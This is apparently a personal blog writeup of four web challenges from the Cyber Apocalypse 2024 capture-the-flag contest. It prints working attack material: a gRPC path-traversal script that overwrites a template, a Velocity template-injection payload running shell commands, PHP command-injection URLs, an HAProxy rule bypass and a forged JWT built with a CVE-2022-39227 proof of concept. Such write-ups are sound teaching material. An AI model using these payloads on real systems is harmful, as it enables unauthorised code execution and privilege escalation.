---
title: Cyber Apocalypse 2024 - 4x Web Challenges Writeup
date: 2024-03-14 08:00:00 -0500
image: 
 path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/htbimage.jpg
 height: 1400
 width: 700
categories: [HTB Writeups, Cyber Apocalypse CTF]
tags: [HTB]
---

I participated as a member of team **CibersecUNI**. In the web category we solved 6/9 challenges as a team. In this writeup I will go through the ones that I have solved:

- [Testimonial](#testimonial)
- [Labyrinth Linguist](#labyrinth-linguist)
- [TimeKORP](#timekorp)
- [Locktalk](#locktalk)

# Testimonial

As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction's hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.

- 🐳 _Instancer_ 2 IP (web ui and Grpc server)
- 📦 [web_testimonial.zip](https://github.com/s4yhii/s4yhii.github.io/raw/master/assets/zip/web_testimonial.zip)


![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313185148.png)

By looking at the file structure I could tell it’s a Golang app where you can send testimonials (name and content).

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313185926.png)

We get 2 ips in the challenge, one is the web interface and the other is the **Grpc** server.

When observing the functions of the website, we can think of stealing the cookies via stored XSS, but reviewing the code, there is no admin-type bot that is reviewing the testimonials.

`err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)`:This block writes the received testimonial to a file located in the directory `public/testimonials`, with the name specified in the `Customer` field of the request.

```go
func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
	if req.Customer == "" {
		return nil, errors.New("Name is required")
	}
	if req.Testimonial == "" {
		return nil, errors.New("Content is required")
	}

	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
	if err != nil {
		return nil, err
	}

	return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
}
```

On the server, there is a **directory traversal** vulnerability in the handling of the client path. The Testimonial **Customer field** is used to specify the file location in which the testimonial will be stored. If this field is not properly validated and the inclusion of relative paths is allowed, we can manipulate this field to navigate outside the expected directory, like the root directory.

We will use this method to overwrite the content of the html website, which is located in the path `../../view/home/index.templ`.

```go

func GetTestimonials() []string {
	fsys := os.DirFS("public/testimonials")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
    <div class="col-md-4">
        <div class="card mb-4">
            <div class="card-body">
                <p class="card-text">"{item}"</p>
                <p class="text-muted">- Anonymous Testifier</p>
            </div>
        </div>
    </div>
  }
}
```

This is done by changing the path of `public/testimonials` to the `root directory /`, in this way it will read all the files inside the root directory, which is where the **flag** is located.

I use copilot to help me build a script in go that:
1. Set up a connection to the server
2. Use the connection to create a new client
3. Create a TestimonialSubmission message (replacing public/testimonial to /)
4. Call the SubmitTestimonial method

```go
package main

import (
	"context"
	"fmt"
	"log"
	"os"

	pb "pb"

	"google.golang.org/grpc"
)

func main() {
	// Set up a connection to the server.
	conn, err := grpc.Dial("83.136.249.230:43168", grpc.WithInsecure())
	if err != nil {
		log.Fatalf("Did not connect: %v", err)
	}
	defer conn.Close()

	// Use the connection to create a new client
	client := pb.NewRickyServiceClient(conn)

	// Create a TestimonialSubmission message
	testimonial := &pb.TestimonialSubmission{
		Customer:    "../../view/home/index.templ",
		Testimonial: "package home\n\nimport (\n\t\"os\"\n)\n\ntempl Index() {\n\t@layout.App(true) {\n<div class=\"container\">\n  <section>\n      <div class=\"row\">\n          @Testimonials()\n      </div>\n  </section>\n</div>\n}\n\nfunc GetTestimonials() []string {\n\tfsys := os.DirFS(\"/\")\n\tfiles, err := fs.ReadDir(fsys, \".\")\n\tif err != nil {\n\t\treturn []string{fmt.Sprintf(\"Error reading testimonials: %v\", err)}\n\t}\n\tvar res []string\n\tfor _, file := range files {\n\t\tfileContent, _ := fs.ReadFile(fsys, file.Name())\n\t\tres = append(res, string(fileContent))\n\t}\n\treturn res\n}\n\ntempl Testimonials() {\n  for _, item := range GetTestimonials() {\n    <div>\n        <p>{item}</p>\n    </div>\n  }\n}",
	}

	// Call the SubmitTestimonial method
	ctx := context.Background()
	_, err = client.SubmitTestimonial(ctx, testimonial)
	if err != nil {
		log.Fatalf("Could not submit testimonial: %v", err)
	}
}
```

As you can see, in the **testimonial parameter** the entire content of the **index.templ** template is sent, to overwrite this file and display the content of the files in the / path.

Before running the script, we change the path of the `pb package` with the path of the pb folder of the challenge, in my case I copied it to the path `/usr/local/go/src/pb` to call it directly

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313194915.png)

Get the flag. 🎉 It was cool to learn about grpc and golang as well. Thanks HackTheBox. :)


# Labyrinth Linguist

You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.

- 🐳 _Instancer_
- 📦 [web_labyrinth_linguist.zip](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/zip/web_labyrinth_linguist.zip)

This was a nice opportunity to see Velocity Set directive in action.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240310123141.png)

By looking at the file structure and the web ui I could tell it’s a Java app that renders English text into Voxalith (kind of strange language)

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240312133119.png)

Looking at this part of the code in main.java, it reads the content of `index.html` file and stores it in the `template` string. Then `getRuntimeServices()` initializes the Velocity runtime services and a new Velocity template object is created.

```java
String template = "";
try {
    template = readFileToString("/app/src/main/resources/templates/index.html", textString);
} catch (IOException e) {
    e.printStackTrace();
}

RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
StringReader reader = new StringReader(template);

org.apache.velocity.Template t = new org.apache.velocity.Template();
t.setRuntimeServices(runtimeServices);

```

The following code is responsible to read the content of a file specified by `filePath` and store it in a `StringBuilder` named `content`. So it will replace occurrences of `"TEXT"` in each line with the `replacement` string.

The vulnerability arises because the replacement string is inserted into the file content without any validation or sanitation.

```java
public static String readFileToString(String filePath, String replacement) throws IOException {
    StringBuilder content = new StringBuilder();
    BufferedReader bufferedReader = null;

    try {
        bufferedReader = new BufferedReader(new FileReader(filePath));
        String line;

        while ((line = bufferedReader.readLine()) != null) {
            line = line.replace("TEXT", replacement);
            content.append(line);
            content.append("\n");
        }
    } finally {
        if (bufferedReader != null) {
            try {
                bufferedReader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    return content.toString();
}
```

Researching about Velocity Framework vulnerabilities I came across this research.
[Apache Velocity Server-Side Template Injection - IWConnect](https://iwconnect.com/apache-velocity-server-side-template-injection/)

This blog explain that Velocity has directives. And one of them is the **#set** directive. With that directive you can execute system command through Java Classes and Constructors.

So, then I modified the payload that it shows us to obtain **RCE**.

```python
import requests

def sendPayload(payload):
    url = "http://94.237.48.205:58185/"
    result1 = requests.post(url, data={"text": payload}).text
    return result1

payload = '''
#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat ../flagc713d64c65.txt"))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
```

RCE is there. 🥳

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240312140604.png)

Or we can send only the payload directly into the input field, click submit and retrieve the flag.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240312140810.png)

Get the flag. 🎉


# TimeKORP

Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.

	🐳 _Instancer_
	📦 ![web_timekorp.zip](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/zip/web_timekorp.zip)

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313220629.png)

By looking at the file structure I could tell it’s a PHP app that shows the time in a format that is sent by the URL.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313220713.png)

In `TimeController.php` the format value is set, if the parameter is not sent, `%H:%M:%S` is set by default. Then passes it to the TimeModel class.

```php
$format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
$time = new TimeModel($format);
```

In `TimeModel.php`, the **format** value will be passed in the public function **__construct**, this value is directly passed to **exec()** function. Using the `exec()` function is very dangerous since with a lack of sanitation it is possible to execute system commands.

```php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

So this is where **Command Injection** is happening, this line runs a shell command, with the `format` value received from the URL.

```php
$this->command = "date '+" . $format . "' 2>&1";
```

We can break the string by prefixing input with a `'` single-quote, then enter our command separator like `|` or `;` and then avoid the redirection at the end with adding a trailing `#` comment to our input.

So our request look like this:

```bash
http://94.237.62.244:57142/?format=%Y-%m-%d'|id+%23
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313230912.png)

RCE is there. 🥳

The last step is to run `cat /flag` and that will print the flag.

```bash
http://94.237.62.244:57142/?format=%Y-%m-%d%27|cat+/flag+%23
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240313231310.png)

Get the flag. 🎉


# LockTalk

In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force...

- 🐳 _Instancer_
- 📦 [web_locktalk.zip](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/zip/web_locktalk.zip)

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314002446.png)

By looking at the file structure I could tell it’s a Python app that shows different endpoints.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314003528.png)

The main objective is to get acces to `/api/v1/flag` endpoint as an user with `administrator` role.

```python
@api_blueprint.route('/get_ticket', methods=['GET'])
def get_ticket():
    claims = {
        "role": "guest", 
        "user": "guest_user"
    }
    
    token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
    return jsonify({'ticket': token})


@api_blueprint.route('/chat/<int:chat_id>', methods=['GET'])
@authorize_roles(['guest', 'administrator'])
def chat(chat_id):
    json_file_path = os.path.join(JSON_DIR, f"{chat_id}.json")

    if os.path.exists(json_file_path):
        with open(json_file_path, 'r') as f:
            chat_data = json.load(f)
        
        chat_id = chat_data.get('chat_id', None)
        
        return jsonify({'chat_id': chat_id, 'messages': chat_data['messages']})
    else:
        return jsonify({'error': 'Chat not found'}), 404


@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200

```

The different endpoints are observed, to access `/flag`, the `administrator` role is needed, it is also observed that a JWT is being created with the **PS256** algorithm and an expiration time of 60 minutes. 

First we need to retrieve the JWT in `/api/v1/get_ticket` endpoint, but its kind of protected as shown in the image below.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314004723.png)

Inspecting the `haproxy.conf` file, we see that the HAProxy is denying requests to endpoints starting with `/api/v1/get_ticket`.

```bash
global
    daemon
    maxconn 256

defaults
    mode http
    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms

frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend
    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }

backend backend
    balance roundrobin
    server s1 0.0.0.0:5000 maxconn 32 check
```

To bypass the rule, we can use multiple slashes `//` or `/./` to retrieve the **ticket**.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314010127.png)

```python
uwsgi
Flask
requests
python_jwt==3.3.3
```

Looking at the requirements.txt file, it is observed that the `python_jwt` version 3.3.3 used is deprecated and has an associated CVE, the `CVE-2022-39227`

[user0x1337/CVE-2022-39227: CVE-2022-39227 : Proof of Concept (github.com)](https://github.com/user0x1337/CVE-2022-39227)

According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with modified claims.

We will download the python script and run it with the JWT that we did not obtain from the endpoint `/api/v1/get_ticket` , and we will change the role from **guest** to **administrator**.

```python
python3 cve_2022_39227.py -j herecomesyourtoken -i "role=administrator"
```

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314002328.png)

The return value is a mix form of JSON and compact representation. You need to paste the entire value including "{" and "}" as your new JWT Web token.

```bash
Authorization: {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzOTY2NTAsImlhdCI6MTcxMDM5MzA1MCwianRpIjoiS1dIQVhUeWRUWXhJWHdlWjIwMU5VUSIsIm5iZiI6MTcxMDM5MzA1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAzOTY2NTAsImlhdCI6MTcxMDM5MzA1MCwianRpIjoiS1dIQVhUeWRUWXhJWHdlWjIwMU5VUSIsIm5iZiI6MTcxMDM5MzA1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"s-TtAkIi6JBvYqfdx9H8oWF5mA4-tOWPKGfv3rCPlIrA8ncyMgC9Ltobo_gk9GXaj9LmydRKKJPpYuCPsf8IFEmI3ex7LRx6mm84jKhTYQh09_X2U7TToEx-OEFdL7yz0OGKCQOLdBHiEYXVTGWnwIuP8tunOmws2OyVKH3FFI1SgtKAo7RtgwxD6spZBiv3R75B55mp8RDFMzh4luqmXMfV0sSw-mA8zRnr9J2Kb3Cpab88d-3HzQm99wrtwOM-t35ZDUsSFHw4CRyN4XQyuwvHlz2dltUjb8ZnPR7U8naiaSbC0MJIBmPezP26FKGpcpQpBtX5pg01zoKAu7C6OQ"}
```

Then we just have to copy the modified JWT to access the endpoint `/api/v1/flag`.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/CA2024/Pasted%20image%2020240314002250.png)

Get the flag. 🎉